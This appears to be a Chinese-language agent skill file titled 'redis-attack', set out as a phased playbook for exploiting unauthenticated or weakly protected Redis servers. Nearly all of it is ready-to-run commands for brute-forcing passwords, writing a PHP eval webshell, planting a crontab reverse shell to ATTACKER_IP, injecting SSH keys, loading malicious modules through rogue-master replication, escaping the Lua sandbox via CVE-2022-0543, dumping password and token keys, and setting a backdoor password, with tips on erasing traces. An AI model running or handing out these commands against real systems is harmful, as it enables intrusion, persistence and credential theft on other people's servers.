---
name: redis-attack
description: "Redis 未授权访问与利用。当发现目标开放 6379 端口、Redis 服务无认证或弱密码、需要从 Redis 获取敏感数据或实现远程命令执行时使用。覆盖未授权访问、数据窃取、crontab 写入 RCE、主从复制 RCE、模块加载 RCE、webshell 写入、SSH 公钥注入、Lua 脚本注入、Pub/Sub 窃听、持久化文件利用"
metadata:
  tags: "redis,6379,未授权,rce,主从复制,crontab,webshell,ssh-key,lua,module-load,redis-rogue-server"
  category: "exploit"
---

# Redis 未授权访问与利用

Redis 默认无认证、监听 0.0.0.0，一旦暴露在网络上攻击面极大——从数据窃取到 RCE 仅需几条命令。

## ⛔ 深入参考（必读）
- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现与版本识别

### 1.1 Nmap 扫描

```bash
# Redis 信息收集脚本
nmap -p 6379 --script redis-info TARGET

# 版本探测
nmap -sV -p 6379 TARGET
```

### 1.2 手动连接测试

```bash
# PING 测试连通性
redis-cli -h TARGET -p 6379 PING
# 返回 PONG 表示无需认证

# 获取服务器信息（关注 redis_version, os, config_file）
redis-cli -h TARGET -p 6379 INFO server
```

**关键判断**：
- 返回 PONG / 正常信息 → 无认证，直接进入 Phase 3
- 返回 `-NOAUTH Authentication required` → 需要认证，进入 Phase 2
- 返回 `redis_version` → 确定版本，决定可用攻击路径

---

## Phase 2: 未授权/弱口令检测

### 2.1 常见弱口令

```bash
# 逐个尝试
redis-cli -h TARGET -p 6379 -a redis INFO server
redis-cli -h TARGET -p 6379 -a password INFO server
redis-cli -h TARGET -p 6379 -a 123456 INFO server
redis-cli -h TARGET -p 6379 -a admin INFO server
redis-cli -h TARGET -p 6379 -a root INFO server
```

### 2.2 暴力破解

```bash
# Hydra
hydra -P passwords.txt redis://TARGET

# Nmap
nmap --script redis-brute -p 6379 TARGET

# Medusa
medusa -h TARGET -P passwords.txt -M redis
```

---

## Phase 3: 攻击决策树

```
连接成功？
├─ 可执行 CONFIG SET → RCE 路径
│   ├─ 目标有 Web 服务 → webshell 写入 (Phase 4.1)
│   ├─ 目标有 cron → crontab 反弹 shell (Phase 4.2)
│   └─ 目标有 SSH → 写 authorized_keys (Phase 4.3)
├─ Redis >= 4.0 → 模块加载 RCE (Phase 4.4)
├─ Redis >= 4.0 → 主从复制 RCE / redis-rogue-server (Phase 4.5)
├─ 可执行 KEYS/GET → 数据窃取 (Phase 5)
│   ├─ 搜索 *password*, *token*, *session*
│   └─ HGETALL 遍历 Hash 数据
├─ 可执行 PSUBSCRIBE → Pub/Sub 窃听 (Phase 6)
└─ 可执行 EVAL → Lua 脚本注入 (Phase 6)
```

**前置信息收集**：

```bash
# 获取当前工作目录和数据库文件名（CONFIG SET 攻击前必查）
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# 获取全部配置
redis-cli -h TARGET -p 6379 CONFIG GET "*"

# 检查 Redis 版本（决定模块加载/主从复制是否可用）
redis-cli -h TARGET -p 6379 INFO server
```

---

## Phase 4: 快速利用命令

### 4.1 Webshell 写入

```bash
redis-cli -h TARGET -p 6379
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php @eval($_POST['cmd']);?>"
> SAVE
```

验证: `curl http://TARGET/shell.php`

### 4.2 Crontab RCE

```bash
redis-cli -h TARGET -p 6379
> SET cron "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SAVE
```

注意: Ubuntu/Debian 路径为 `/var/spool/cron/crontabs/`，CentOS/RHEL 为 `/var/spool/cron/`。

### 4.3 SSH 公钥写入

```bash
# 生成密钥对
ssh-keygen -t rsa -f /tmp/redis_rsa

# 格式化公钥（前后加换行避免 Redis 数据干扰）
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/spaced_key.txt

# 导入并写入
cat /tmp/spaced_key.txt | redis-cli -h TARGET -p 6379 -x set ssh_key
redis-cli -h TARGET -p 6379 CONFIG SET dir /var/lib/redis/.ssh
# 如果 Redis 以 root 运行，改用 /root/.ssh
redis-cli -h TARGET -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET -p 6379 SAVE

# 登录
ssh -i /tmp/redis_rsa redis@TARGET
```

### 4.4 模块加载 RCE (Redis >= 4.0)

```bash
# 需先将恶意 .so 上传到目标（通过主从复制或其他途径）
redis-cli -h TARGET -p 6379 MODULE LOAD /path/to/module.so
redis-cli -h TARGET -p 6379 system.exec "id"
redis-cli -h TARGET -p 6379 system.rev ATTACKER_IP 9999
```

### 4.5 主从复制 RCE

```bash
# 自动化利用（Redis <= 5.0.5）
python3 redis-rogue-server.py --rhost TARGET --rport 6379 --lhost ATTACKER_IP

# 手动利用
redis-cli -h TARGET -p 6379 SLAVEOF ATTACKER_IP 6379
# 传输恶意模块后
redis-cli -h TARGET -p 6379 MODULE LOAD /tmp/module.so
redis-cli -h TARGET -p 6379 system.exec "id"
# 清理
redis-cli -h TARGET -p 6379 MODULE UNLOAD mymodule
redis-cli -h TARGET -p 6379 SLAVEOF NO ONE
```

→ 更多方法与完整 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: 数据窃取

```bash
# 列出所有键
redis-cli -h TARGET -p 6379 KEYS "*"

# 搜索敏感键名
redis-cli -h TARGET -p 6379 KEYS "*password*"
redis-cli -h TARGET -p 6379 KEYS "*secret*"
redis-cli -h TARGET -p 6379 KEYS "*token*"
redis-cli -h TARGET -p 6379 KEYS "*session*"

# 获取值
redis-cli -h TARGET -p 6379 GET keyname

# 遍历 Hash 类型
redis-cli -h TARGET -p 6379 HGETALL keyname

# 大数据库用 SCAN 替代 KEYS（避免阻塞）
redis-cli -h TARGET -p 6379 SCAN 0 MATCH "*password*" COUNT 100
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整数据窃取命令

---

## Phase 6: 其他攻击向量

### 6.1 Pub/Sub 窃听

```bash
# 监听所有频道
redis-cli -h TARGET -p 6379 PSUBSCRIBE "*"
```

### 6.2 Lua 脚本注入

```bash
# 执行系统命令（CVE-2022-0543, Debian/Ubuntu 特有）
redis-cli -h TARGET -p 6379 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

### 6.3 配置篡改

```bash
# 读取当前认证配置
redis-cli -h TARGET -p 6379 CONFIG GET requirepass
redis-cli -h TARGET -p 6379 CONFIG GET masterauth

# 设置后门密码
redis-cli -h TARGET -p 6379 CONFIG SET requirepass "backdoor_pass"
```

### 6.4 持久化文件利用

```bash
# 触发 RDB 持久化
redis-cli -h TARGET -p 6379 BGSAVE

# 获取持久化文件路径
redis-cli -h TARGET -p 6379 CONFIG GET dir
redis-cli -h TARGET -p 6379 CONFIG GET dbfilename

# 下载后用 rdbtools 解析
rdb --command json /path/to/dump.rdb
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节

---

## 工具速查

| 工具 | 用途 |
|------|------|
| redis-cli | Redis 官方客户端 |
| redis-rogue-server | 主从复制自动化 RCE |
| RedisModules-ExecuteCommand | 恶意 .so 模块生成 |
| rdbtools | RDB 持久化文件解析 |
| hydra / medusa | Redis 密码爆破 |
| nmap redis-info / redis-brute | Redis 信息收集与爆破脚本 |

---

## 注意事项

- `SAVE` 操作会阻塞 Redis，可能导致服务中断；生产环境优先用 `BGSAVE`
- `CONFIG SET` 操作被记录到 Redis 日志，注意痕迹清理
- `KEYS *` 在大数据库上严重阻塞，生产环境用 `SCAN` 替代
- CONFIG SET 写文件会覆盖原有 RDB 内容，操作前备份 `CONFIG GET dir` 和 `CONFIG GET dbfilename`
- 主从复制 RCE 完成后务必执行 `SLAVEOF NO ONE` 和 `MODULE UNLOAD` 清理
- Crontab 写入仅在目标以 root 运行 Redis 时有效
